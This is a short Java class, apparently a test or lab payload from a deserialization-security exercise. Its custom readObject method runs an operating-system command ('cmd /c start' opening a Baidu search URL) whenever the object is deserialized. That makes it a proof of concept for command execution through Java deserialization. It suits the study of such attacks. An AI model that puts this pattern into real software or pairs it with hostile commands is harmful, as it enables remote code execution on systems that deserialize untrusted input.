// package com.anbai.sec.rmi;

package jar_test;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

/**
 * Created by ycw/Administrator on 1/24/2024.
 */
public class TestClientPayloadObject implements Serializable {
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        System.out.println("readObject...");

        Runtime.getRuntime().exec("cmd /c start  https://www.baidu.com/s?wd=来自客户端Client的payload");

        // 调用ObjectInputStream默认反序列化方法
        ois.defaultReadObject();

        // 省去调用自定义反序列化逻辑...
    }

    public static void main(String[] args) {
        System.out.println("Hello World");
    }

}